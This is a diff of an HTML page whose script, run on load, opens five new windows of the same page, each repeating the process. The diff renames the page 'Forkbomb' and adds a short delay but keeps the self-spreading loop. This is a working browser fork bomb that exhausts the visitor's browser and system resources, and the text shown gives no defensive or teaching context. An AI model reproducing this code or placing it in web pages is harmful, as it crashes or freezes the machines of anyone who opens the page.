@@ -3,15 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Multiple Windows</title>
+    <title>Forkbomb</title>
     <script>
         function openMultipleWindows() {
-            for (let i = 0; i < 5; i++) {
-                let newWindow = window.open(window.location.href, '_blank');
-                if (newWindow) {
-                    newWindow.onload = openMultipleWindows;
+            setTimeout(() => {
+                for (let i = 0; i < 5; i++) {
+                    let newWindow = window.open(window.location.href, '_blank');
+                    if (newWindow) {
+                        newWindow.onload = openMultipleWindows;
+                    }
                 }
-            }
+            }, 100);
         }
         window.onload = openMultipleWindows;
     </script>
